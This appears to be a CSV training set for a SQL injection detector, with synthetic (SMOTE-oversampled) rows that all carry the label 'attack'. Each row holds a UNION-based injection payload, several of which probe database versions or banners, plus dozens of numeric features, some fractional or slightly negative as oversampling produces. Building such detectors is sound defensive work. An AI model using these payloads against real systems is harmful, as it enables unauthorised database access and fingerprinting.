id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000152,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000030,0.1610234732320863,97.97115274643265,26.028847253567346,3.6604173205241843,42.201930774971416,4.942305492865312,36.88461098573062,13.94230549286531,0.43078064386671855,0.05044079261189116,0.3764737244880699,0.14230483903332034,2.9134582392979667,0.02884725356734441,2.0,0.0,1.0,1.9711527464326553,0.0,4.0,0.0,0.0,1.0,4.971152746432655,0.9711527464326555,0.02884725356734455,1.0,0.028847253567344633,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000153,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000105,0.6909092841546728,40.351884680417946,20.0,4.027635227511474,14.0,15.48150774433436,4.0,6.87037693608359,0.35866746749709755,0.3695990390034829,0.10247641928488502,0.16925707421453448,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,1.87037693608359,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000154,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000147,0.8315729981153293,100.62070913467417,27.45976362177528,4.145047985511558,29.0,42.160945512898884,15.0,14.459763621775279,0.2882748499796444,0.4188062230530821,0.149107681023954,0.1438112459433195,1.9195272435505584,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.540236378224721,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000155,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000129,0.43389255528079756,64.48890048227108,20.302219903545787,3.676446219571975,14.0,34.79112038581686,4.0,11.697780096454215,0.2173759049300062,0.5391489140839926,0.062107401408573196,0.18136777957742806,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,6.697780096454215,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,0.1701043153784038,88.79600566210861,26.759201132421722,4.027027319538516,25.0,31.03680452968689,22.0,10.759201132421722,0.28171239979703067,0.34926016032475093,0.247906911821387,0.1211205280568314,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.7592011324217225,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000157,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000047,0.5434574370168125,88.36091079224666,30.60651486795889,4.273282590821508,29.0,33.57394052816444,15.0,10.786970264082221,0.32908561782449536,0.37918957523377417,0.17021669887473898,0.1215081080669915,1.3934851320411101,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.39348513204111,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000158,attack,union,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",nearest_attack_euclidean,R000068,0.3306765503592282,109.6013298751128,28.0,3.9582777650465717,25.0,48.79734024977441,20.80398962533838,15.0,0.22811167955573908,0.4453572048375228,0.18966410787329469,0.13686700773344343,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.8006649375563972,0.0,0.0,8.199335062443602,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000159,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,0.9600136127921173,88.59065092807893,25.703626037123158,4.122842931007863,27.0,38.07252074246314,11.0,12.518130185615785,0.3106004144574338,0.42267801502948776,0.12654090959376932,0.14018066091930906,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,7.518130185615786,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000160,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000089,0.05773091125150108,59.573707990502434,19.914741598100488,3.830956809945991,14.0,31.65896639240195,4.0,9.914741598100488,0.23514184488877757,0.5312664629842543,0.06718338425393644,0.16640830787303176,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.914741598100488,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000063,0.5198015503482447,48.2711773635588,20.54576452728824,4.028771943577393,14.0,21.816941890847033,4.0,8.454235472711758,0.2927802567719641,0.4486636918736431,0.08365150193484688,0.17490454941954595,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,3.454235472711759,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000076,0.347852658350939,58.5977220297856,21.173181468652373,3.9906697189823013,14.0,30.07817762382848,4.0,10.51954440595712,0.24085309144441688,0.5109762902666997,0.0688151689841191,0.17935544930476427,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,5.519544405957121,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000163,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000067,0.09024474576352746,84.53736370994585,28.953736370994584,4.290950366858976,36.629890967956676,20.0,16.90747274198917,11.0,0.43304443529542297,0.23674552561585616,0.2,0.1302100390887209,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.9537363709945845,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.9537363709945845
SMOTE_000164,attack,union,"-6389"" union all select 2355,2355,2355,2355,2355--",nearest_attack_euclidean,R000056,0.24476815776461636,48.31397617401921,19.831397617401922,3.855241444783427,14.0,22.65118093921537,4.0,7.662795234803843,0.29180216678186555,0.46651180939215364,0.08337204765196157,0.1583139761740192,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,3.6627952348038426,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000149,0.5053898510682181,87.3628952600578,29.23387210570603,4.261042934167165,29.0,31.06451157717588,15.0,12.29838368288191,0.33234804569174076,0.3553204826043853,0.1719041615646935,0.14042731013918042,2.53225578858794,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.7661278942939704,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000166,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000061,0.36168177470968677,58.453908912691915,20.0,3.695747189643149,14.0,29.963127130153534,4.0,10.490781782538384,0.23994299625945936,0.5120684044886488,0.06855514178841697,0.17943345746347492,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,5.490781782538384,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000052,0.17466452236947833,103.97564285375026,29.609742858499896,4.08642435184516,25.0,48.780514283000215,16.0,14.195128570750054,0.24052579365841814,0.46903650792601664,0.1539365079413876,0.1365011904741776,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.195128570750052,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000168,attack,union,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",nearest_attack_euclidean,R000151,0.08704542214516561,70.29459836489809,20.0,3.6993779325233893,14.0,39.43567869191848,4.0,12.85891967297962,0.19946331629910566,0.5606440204410732,0.056989518942601625,0.18290314431721952,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,7.858919672979619,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000169,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000012,0.18174499722482082,75.0,31.946932757846156,4.385832324485956,44.0,2.946932757846156,17.0,11.053067242153842,0.5866666666666667,0.03929243677128208,0.22666666666666666,0.14737422989538457,0.0,0.0,2.0,0.0,1.053067242153843,1.0,0.0,-1.1102230246251565e-16,0.9469327578461568,0.0,1.0,6.053067242153843,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000170,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.5306797974695222,112.51581165757234,29.254743497271704,4.27787364490051,35.01264932605788,44.0,16.50316233151447,17.0,0.31042398684608524,0.39166081052313184,0.14659170765593657,0.15132349497484637,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.7515811657572351,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.751581165757235
SMOTE_000171,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000061,0.271233173621392,54.738414601048376,20.0,3.7943999610539705,14.0,26.990731680838707,4.0,9.747682920209677,0.25618424215172364,0.4925789094179316,0.07319549775763531,0.1780413506727094,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,4.747682920209677,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000097,0.5264106451686482,85.0,28.214122135011223,4.1841049951204194,30.712977080089793,26.28702291991021,15.428244270022448,12.571755729977552,0.36132914211870343,0.3092590931754142,0.18150875611791115,0.1479030085879712,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.5717557299775526,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.2141221350112238,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.214122135011224
SMOTE_000173,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000108,0.3449991118602747,76.07858988329752,28.584282023340496,4.285143230076211,29.0,21.66287190663802,15.0,10.415717976659506,0.3821944809176917,0.28337849475953397,0.19768680047466813,0.1367402238481062,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.4157179766595056,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000174,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000046,0.0058396754780545065,106.9901950434694,27.00326831884353,4.064579959307273,29.0,47.98692672462587,15.0,15.003268318843533,0.27105358948053443,0.44851471939687604,0.1402001324899316,0.14023155863265788,1.006536637687066,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.996731681156467,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000175,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000087,0.23198068313161685,56.68605004306875,19.0,3.6427375327945692,14.0,29.348840034455,4.0,9.33721000861375,0.24739251496879922,0.5172656971785151,0.0706835757053712,0.16465821214731438,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.33721000861375,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,0.7607111420752528,68.8661656907918,25.591077712719454,4.214881580991375,27.0,23.092932552633446,11.0,7.773233138158361,0.3968030058552492,0.3297149560234084,0.16166048386695336,0.11182155425438908,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,3.7732331381583615,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000177,attack,union,"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",nearest_attack_euclidean,R000081,0.1345909775241351,94.99527360750069,32.19905472150014,4.465812724758145,37.0,28.79621888600056,17.0,12.19905472150014,0.3900229237285257,0.30245724324361045,0.1791997217131064,0.12832011131475743,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.1990547215001395,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000178,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000011,0.13258809015309922,101.85766424916956,26.0,4.049248795365927,65.43065699667824,4.142335750830441,24.14233575083044,8.14233575083044,0.6423336413527461,0.04068021642283315,0.23703497423846198,0.07995116798595889,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.14233575083044,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000179,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.4177579597250431,43.449226583476175,19.0,3.843276223076338,14.0,18.75938126678094,4.0,6.689845316695235,0.32805037628696976,0.4250852842434631,0.09372867893913422,0.15313566053043287,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,2.6898453166952354,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000147,0.028020600726787685,101.88628192146604,27.014214759816745,4.114740206145912,29.0,43.886281921466036,15.0,14.0,0.2846576787940639,0.4306846424118722,0.14723673041072272,0.1374209483833412,1.02842951963349,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.971570480366509,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000181,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000063,0.041090913681351864,50.837923366716225,20.06483065331351,3.95652133563916,14.0,23.87033869337298,4.0,8.967584673343245,0.2754770131568512,0.4694275842117786,0.07870771804481462,0.17638768458655563,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,3.967584673343245,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,union," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000020,1.3081773459815327,75.68856674687177,32.68856674687177,4.434839520686647,41.37713349374354,3.0,17.0,14.311433253128229,0.546621463536122,0.03963759644901482,0.22461304654441752,0.1891278934704457,3.0,0.0,2.0,0.0,1.3114332531282278,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.622866506256456,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.6885667468717722,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.688566746871772
SMOTE_000183,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000107,0.1499008019123195,54.03756839046738,21.10375683904674,3.841165606644212,14.0,16.830054712373908,14.0,9.207513678093477,0.25980055182193973,0.31009038799291366,0.25980055182193973,0.17030850836320688,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,2.207513678093476,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
